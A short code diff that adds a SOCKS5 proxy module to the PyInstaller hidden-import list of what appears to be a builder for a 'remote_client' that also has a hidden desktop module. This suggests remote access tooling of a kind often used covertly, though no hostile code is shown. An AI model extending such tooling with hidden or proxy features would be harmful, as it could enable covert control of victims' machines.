@@ -272,6 +272,7 @@ class BuilderWorker(QtCore.QThread):
             "remote_client.apps",
             "remote_client.apps.launcher",
             "remote_client.windows.hidden_desktop",
+            "remote_client.proxy.socks5_server",
         ]
         for module in hidden_imports:
             args.extend(["--hidden-import", module])
